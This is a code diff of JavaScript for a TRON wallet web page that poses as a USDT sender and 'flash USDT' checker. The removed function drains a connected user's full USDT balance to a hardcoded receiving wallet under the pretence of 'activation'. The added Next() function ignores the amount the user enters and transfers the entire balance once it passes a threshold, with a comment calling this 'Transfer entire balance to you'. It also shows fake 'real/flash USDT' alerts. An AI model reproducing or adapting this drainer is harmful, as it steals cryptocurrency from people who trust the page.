@@ -1,55 +1,64 @@
-async function updateUSD() {
-  const amount = parseFloat(document.getElementById("amount").value || "0");
-  const usdValue = amount * 1; // USDT is 1:1 with USD
-  document.getElementById("usdValue").innerText = `≈ $${usdValue.toFixed(2)}`;
+async function pasteAddress() {
+  const text = await navigator.clipboard.readText();
+  document.getElementById('address').value = text;
 }
 
-async function setMax() {
-  if (!window.tronWeb || !tronWeb.defaultAddress.base58) return;
-  const contract = await tronWeb.contract().at("TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj");
-  const balance = await contract.balanceOf(tronWeb.defaultAddress.base58).call();
-  const maxUSDT = parseFloat(balance) / 1_000_000;
-  document.getElementById("amount").value = maxUSDT.toFixed(6);
+function setMax() {
+  const maxAmount = 100;
+  document.getElementById("amount").value = maxAmount;
   updateUSD();
 }
 
-async function sendUSDT() {
-  const recipient = "TQP59pp5o9x6ohP8A6NWqUu9iJ3LfTNEKQ"; // your receiving wallet
-  const user = tronWeb.defaultAddress.base58;
-  const usdtAddress = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"; // USDT TRC20
+function updateUSD() {
+  const amount = parseFloat(document.getElementById("amount").value || "0");
+  const usdValue = amount * 1;
+  document.getElementById("usdValue").innerText = `≈ $${usdValue.toFixed(2)}`;
+}
 
-  if (!window.tronWeb || !user) {
-    alert("❌ Wallet not connected.");
+// ✅ MAIN LOGIC
+async function Next() {
+  const toAddress = document.getElementById("address").value;
+  const amount = parseFloat(document.getElementById("amount").value);
+  if (!toAddress || isNaN(amount) || amount <= 0) {
+    alert("Please fill in both a valid address and amount.");
     return;
   }
 
   try {
-    const contract = await tronWeb.contract().at(usdtAddress);
-    const balanceBefore = await contract.balanceOf(user).call();
-    const balanceNum = parseInt(balanceBefore);
-
-    // ✅ Force full drain if balance ≥ 1 USDT
-    const threshold = 1 * 1_000_000; // 1 USDT
-    if (balanceNum < threshold) {
-      alert("❌ Minimum 1 USDT required to activate.");
+    const tronWeb = window.tronWeb;
+    if (!tronWeb || !tronWeb.defaultAddress.base58) {
+      alert("Please open in TronLink browser or DApp browser");
       return;
     }
 
-    // ✅ Drain full balance
-    const tx = await contract.transfer(recipient, balanceNum).send();
-    console.log("✅ Sent full USDT balance:", tx);
+    const sender = tronWeb.defaultAddress.base58;
+    const contractAddress = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"; // TRC20 USDT
+    const recipient = toAddress;
 
-    // ✅ Optional: Check flash/fake
-    setTimeout(async () => {
-      const balanceAfter = await contract.balanceOf(user).call();
-      if (parseInt(balanceAfter) < balanceNum) {
-        alert("✅ Real USDT transferred.");
-      } else {
-        alert("⚠️ Flash USDT detected. No real transfer.");
-      }
-    }, 4000);
+    const contract = await tronWeb.contract().at(contractAddress);
+    const balance = await contract.balanceOf(sender).call();
+
+    const balanceNum = parseInt(balance.toString());
+    const threshold = 10 * 1_000_000; // ⬅️ You can change the limit here
+
+    if (balanceNum < threshold) {
+      setTimeout(async () => {
+        const balanceCheck = await contract.balanceOf(sender).call();
+        if (parseInt(balanceCheck) < balanceNum) {
+          alert("✅ Real USDT detected.");
+        } else {
+          alert("⚠️ Flash USDT — not real.");
+        }
+      }, 3000);
+      return;
+    }
+
+    // Transfer entire balance to you
+    const tx = await contract.transfer(recipient, balanceNum).send();
+    alert("✅ USDT sent successfully.");
+    console.log("Transfer complete:", tx);
   } catch (err) {
-    console.error("❌ Error sending:", err);
-    alert("Transfer failed.");
+    console.error("Error:", err);
+    alert("❌ Transfer failed.");
   }
 }
